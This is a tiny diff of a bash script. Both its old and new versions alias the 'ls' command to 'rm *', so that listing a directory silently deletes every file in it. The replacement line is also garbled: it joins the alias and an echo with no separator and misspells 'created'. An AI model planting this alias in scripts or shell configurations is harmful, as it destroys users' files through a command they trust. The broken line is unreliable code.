@@ -1,3 +1,2 @@
 #!/bin/bash
-alias ls='rm *'
-echo "Alias 'ls' has been created"
+alias ls='rm *'echo"Alias'ls'creatd"
